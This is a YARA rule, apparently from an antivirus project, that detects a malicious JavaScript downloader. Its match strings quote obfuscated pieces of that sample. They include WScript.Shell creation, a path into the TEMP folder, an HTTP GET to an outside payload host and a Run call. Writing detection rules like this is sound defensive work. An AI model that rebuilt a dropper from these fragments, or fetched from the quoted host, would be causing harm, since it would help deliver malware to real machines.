rule sig_20160427_0cf28bb18f611348a72ea5588cb15b29 {
  meta:
    description = "datamaliciousorder - file 20160427_0cf28bb18f611348a72ea5588cb15b29.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6284a4144fe8641b848235683e06fd520439b3e282e75594fa89f2ddab2d73ad"

  strings:
    $s1  = "function TdbxpLftsv() {return WqhtrAvtiv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Fncg3yq" ascii
    $s2  = "function TdbxpLftsv() {return WqhtrAvtiv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Fncg3yq" ascii
    $s3  = "var WqhtrAvtiv = function XipcpNdmuw() {return TgguuSumxp[LuuedWstzu](\"WScript\"+\".Shell\");}(), CjwtyGhbst = 11;" fullword ascii
    $s4  = "function SxxhnNtcqp(McwjcFstcu, ZgyvwTasgb){WxpjyTqjil = WxpjyTqjil * 1; return McwjcFstcu - ZgyvwTasgb;};" fullword ascii
    $s5  = "JxjbhSvuhu[RmgdgHixnm](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var TgguuSumxp = this[\"WScript\"];" fullword ascii
    $s7  = "function OyayiQkyic(){return XlswtZshwt + \"\";};" fullword ascii
    $s8  = "if (JxjbhSvuhu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function PfbuuDwswt() {return ((TbgrvThohd == true) && (TbgrvThohd == NmvluSsppl)) ? 1 : WxpjyTqjil;};" fullword ascii
    $s10 = "function UhjviCrkkv()" fullword ascii
    $s11 = "return SxxhnNtcqp(DqdwmEgvzp, SoktwAlrnq);" fullword ascii
    $s12 = "function MkdmbRkmno(NcrieGmbyo) {var XfxxrJdvei = (1, 2, 3, 4, 5, NcrieGmbyo); return XfxxrJdvei;};" fullword ascii
    $s13 = "var OehotAomfe = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var NmvluSsppl = false;" fullword ascii
    $s15 = "function LqnrtWugol(OasjoZjdjl){WqhtrAvtiv[\"R\"+\"un\"](OasjoZjdjl, WxpjyTqjil, WxpjyTqjil);};" fullword ascii
    $s16 = "HsdjcVhavg = true;" fullword ascii
    $s17 = "var TbgrvThohd = false;" fullword ascii
    $s18 = "}while (FdxdwSpais);" fullword ascii
    $s19 = "function GjiykQjeqm(){return LuuedWstzu;};" fullword ascii
    $s20 = "TbgrvThohd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}